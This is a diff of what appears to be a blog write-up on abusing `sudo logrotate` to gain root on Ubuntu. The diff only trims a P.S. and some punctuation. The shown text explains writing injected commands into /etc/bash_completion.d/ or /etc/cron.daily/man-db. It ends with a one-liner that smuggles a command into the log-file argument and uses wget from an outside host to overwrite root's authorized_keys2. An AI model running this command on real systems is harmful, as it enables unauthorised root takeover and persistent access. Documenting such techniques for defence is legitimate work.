@@ -7,8 +7,6 @@ categories: security
 
 The scenario is this: a brand new Ubuntu 22.04 server has an account which is restricted to running `sudo logrotate *`.  Can we get root? Short answer: Yes. I couldn't find much online about this type of exploitation of logrotate, so let's document something for future use.
 
-P.S: This seems like the type of thing that people who create CTFs might be interested in. It seems like some fun.
-
 ---
 
 Note: as mentioned, the _user_ is limited to _only_ running `sudo logrotate *` either through some `rbash`  setup, or an ssh _authorized_keys_ ForceCommand which limits execution -- the _user_ cannot run anything other than `sudo logrotate`:
@@ -185,7 +183,7 @@ Linux server 5.15.0-83-generic #92-Ubuntu SMP Mon Aug 14 09:30:42 UTC 2023 x86_6
 Linux server 5.15.0-83-generic #92-Ubuntu SMP Mon Aug 14 09:30:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
-Basically, we can create an arbitrary file in `/etc/bash_completion.d/` which, if bash completion is enabled, will be sourced when a user logs into the server. The arbitrary data is `2>/dev/null;uname -a; return 0;` which effectively sends the first garbage data to _/dev/null_; executes `uname -a`; then returns, ignoring the rest of the junk data. This could be used to get a shell when a real user logs into the server, hopefully obtaining more access. Alternatively, we could create some file in _/etc/init.d/_, _/etc/profile.d/_, or overwrite _/etc/profile_. The possibilities are endless!
+Basically, we can create an arbitrary file in `/etc/bash_completion.d/` which, if bash completion is enabled, will be sourced when a user logs into the server. The arbitrary data is `2>/dev/null;uname -a; return 0;` which effectively sends the first garbage data to _/dev/null_; executes `uname -a`; then returns, ignoring the rest of the junk data. This could be used to get a shell when a real user logs into the server, hopefully obtaining more access. Alternatively, we could create some file in _/etc/init.d/_, _/etc/profile.d/_, or overwrite _/etc/profile_. The possibilities are endless.
 
 ---
 
@@ -215,11 +213,11 @@ user@server:/etc/cron.daily$ ls -l man-db
 user@server:/etc/cron.daily$ ./man-db
 Linux server 5.15.0-83-generic #92-Ubuntu SMP Mon Aug 14 09:30:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 ```
-The next time the cronjob runs, our arbitrary code is executed: as root!
+The next time the cronjob runs, our arbitrary code is executed: as root.
 
 ---
 
-So, to answer the question: with only the `sudo logrotate` command available, can we obtain root? Yep! it's as simple as:
+So, to answer the question: with only the `sudo logrotate` command available, can we obtain root? Yep; it's as simple as:
 ```bash
 sudo logrotate -l /etc/cron.daily/man-db '2>/dev/null;wget host/ssh.key -O /root/.ssh/authorized_keys2; exit 0;'
 ```
